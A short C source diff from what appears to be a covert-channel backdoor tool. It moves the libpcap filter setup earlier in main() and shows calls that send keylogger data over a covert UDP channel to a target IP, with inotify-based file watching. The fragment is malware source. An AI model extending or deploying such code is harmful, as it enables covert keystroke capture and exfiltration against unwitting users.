@@ -95,6 +95,11 @@ int main(int argc, char **argv){
 
     memset(data, 0, sizeof(data));
 
+    //create filter (tcp/udp, command, ip, port)
+    Filter = InitFilter(targetip, localip, false, tcp, flag);
+    CreateFilter(pcapfilter, tcp);
+    printf("Filter: %s\n",pcapfilter);
+
     //validate inotify directory and file
     if((if_directory && !if_file) || (!if_directory && if_file)) {
         perror("inotify requires both --directory and --file");
@@ -128,10 +133,6 @@ int main(int argc, char **argv){
         covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
     }
 
-    //create filter (tcp/udp, command, ip, port)
-    Filter = InitFilter(targetip, localip, false, tcp);
-    CreateFilter(pcapfilter, tcp);
-    printf("Filter: %s\n",pcapfilter);
 
     //libpcap (tcp/udp, command)
     Packetcapture(pcapfilter,Filter);
